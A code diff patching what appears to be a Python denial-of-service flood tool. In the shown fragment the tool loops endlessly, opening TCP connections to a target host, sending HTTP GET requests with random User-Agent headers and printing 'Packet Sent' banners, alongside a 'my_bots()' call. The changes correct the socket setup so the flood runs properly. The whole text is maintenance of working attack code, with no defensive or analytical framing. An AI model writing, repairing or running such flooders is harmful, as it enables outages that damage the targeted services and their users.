@@ -151,9 +151,8 @@ def down_it(item):
 	try:
 		while True:
 			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOCK_DGRAM)
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((host,int(port)))
-			bytes = random._urandom(1490)
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
 				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m [*] Packet Sent ✓ AsparTim  \033[0m")
@@ -253,9 +252,8 @@ if __name__ == '__main__':
 	my_bots()
 	time.sleep(5)
 	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOCK_DGRAM)
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((host,int(port)))
-		bytes = random._urandom(1490)
 		s.settimeout(1)
 	except socket.error as e:
 		print("\033[91m [*] Check Server İp And Port\033[0m")
